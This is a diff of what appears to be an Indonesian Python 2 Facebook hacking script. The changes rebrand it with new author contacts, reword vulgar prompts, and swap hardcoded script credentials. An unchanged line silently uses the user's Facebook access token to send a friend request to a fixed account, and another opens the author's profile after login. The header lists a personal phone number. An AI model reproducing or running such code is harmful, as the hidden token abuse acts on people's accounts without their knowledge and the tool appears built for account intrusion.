@@ -59,6 +59,7 @@ logo = """
 \033[0;93m[\033[0;93m ⚝ \033[0;93m] Author : Ardiansyah Putra
 \033[0;93m[\033[0;93m ⚝ \033[0;93m] Facebook : https://www.facebook.com/ARDIANSYAH.PUTRA.LEVIATHAN.KINGS07
 \033[0;93m[\033[0;93m ⚝ \033[0;93m] Whatsapps: 081217884551
+\033[0;93m[\033[0;93m ⚝ \033[0;93m] Instagram : ardiansyah.putra27
 \033[0;93m\033[0;93m=============================================== 
 """
 def tik():
@@ -79,9 +80,9 @@ vuln = "\033[32mVuln"
 
 def siapa():
 	os.system('clear')
-	nama = raw_input("\033[1;97mSiapa nama kamu kontol ? \033[1;91m: \033[1;92m")
+	nama = raw_input("\033[1;97mNama Kamu siapa? \033[1;91m: \033[1;92m")
 	if nama =="":
-		print"\033[1;96m[!] \033[1;91mIsi yang bener kontol"
+		print"\033[1;96m[!] \033[1;91mIsi yang bener ntar gadapet jatah loh:)"
 		time.sleep(1)
 		siapa()
 	else:
@@ -93,11 +94,11 @@ def siapa():
 		
 def loginSC():
 	os.system('clear')
-	print"\033[1;97mSilahkan login SC nya dulu bosque\n"
+	print"\033[1;97mSilahkan login SC NYA Dulu Bang"
 	username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
 	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="kontol" and password =="kecil":
-		print"\033[1;96m[✓] \033[1;92mLogin success"
+	if username =="ardian.gantenk" and password =="ardian123":
+		print"\033[1;96m[✓] \033[1;92mCieee bisa login :)"
 		time.sleep(1)
 		login()
 	else:
@@ -145,7 +146,7 @@ def login():
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://www.youtube.com/omaliptv')
+				os.system('xdg-open https://www.facebook.com/ARDIANSYAH.PUTRA.LEVIATHAN.KINGS07')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
